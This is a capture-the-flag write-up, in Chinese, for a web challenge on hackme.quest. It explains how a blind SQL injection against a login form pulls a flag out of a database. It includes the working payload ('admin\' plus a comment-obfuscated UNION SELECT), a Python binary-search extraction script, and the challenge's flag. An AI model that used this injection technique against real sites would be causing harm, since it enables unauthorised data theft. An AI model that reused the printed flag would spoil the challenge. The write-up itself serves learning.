# PHM #24 Web — login as admin 1.2

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 60 |

## 題目

> Find flag2 — it's in the database, flag1 was just the warm-up.
>
> 連結: 同 [`/login1/`](https://ctf.hackme.quest/login1/) (就是 #23 解完後出現 `flag2 in the database!` 的 hint)

## 分析

打完 #23 後, source 的這段洩漏 hint:

```php
if($user->isadmin) printf("<code>%s</code>, %s", htmlentities($flag1), $where_is_flag2);
```

`$flag1` 是 PHP 常數 (已拿到), `$where_is_flag2` 是提示字串. 真正的 flag2 在 DB 裡, 但**畫面只顯示 $_POST['name']**, UNION 塞不進 UI 回顯. → 只能 **blind SQLi**.

Oracle: `$user->isadmin` 的 truthy/falsy 決定頁面出不出 "You are admin!":
- `UNION SELECT 0,0,0,({cond})` → isadmin = cond 結果
- `cond=1` → admin → 顯示 "You are admin!"
- `cond=0` → 不是 admin

有了 1-bit oracle, 用 binary search 一次拉一個字元, 效率 ~log₂(95)≈7 req/char. 用 thread pool parallel 更快.

Schema 查完後:
- Table: `0bdb54c98123f5526ccaed982d2006a9` (隨機 hash)
- Column: `4a391a11cfa831ca740cf8d00782f3a6`
- 內容是 66 字元的 flag

## 解法

```python
import urllib.parse, urllib.request, ssl
from concurrent.futures import ThreadPoolExecutor

def oracle(cond):
    pwd = f"/**/UNION/**/SELECT/**/0,0,0,({cond})#"
    data = urllib.parse.urlencode({'name': 'admin\\', 'password': pwd}).encode()
    req = urllib.request.Request(URL, data=data, headers={'User-Agent': UA})
    return 'You are admin!' in urllib.request.urlopen(req, context=ctx).read().decode()

def char_at(expr, i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo+hi)//2
        if oracle(f"ASCII(SUBSTR(({expr}),{i},1))>{mid}"):
            lo = mid+1
        else:
            hi = mid
    return chr(lo)

# 1. Count tables, extract names (via information_schema.tables)
# 2. Dump columns of each table
# 3. 鎖定 hash table → extract value
expr = "SELECT `4a391a11cfa831ca740cf8d00782f3a6` FROM `0bdb54c98123f5526ccaed982d2006a9`"

# 用 10-30 threads 平行拉 ~66 字元
with ThreadPoolExecutor(max_workers=10) as ex:
    futs = {ex.submit(char_at, expr, i+1): i for i in range(66)}
    ...
```

字串裡的 table/column name 用 `` ` `` 包起來, 不用引號 (引號會被 `str_replace` escape 掉). 多階段 enum tables → columns → values 全程相同 payload 結構.

## Flag

```
FLAG{W0W, You found the correct table and the flag, and UserAgent}
```

## 感想

Blind SQLi 的經典流程:
1. 建立 1-bit oracle (這題用 isadmin truthy/falsy)
2. Binary search 單字元
3. Thread pool 並行 (sequential 太慢)

Table/column 用隨機 hash 命名是常見防爛掃迷惑手段, 但 blind enum 一樣會找到. 真正的防禦是**不要在同一個 oracle 上洩漏任何 condition**.
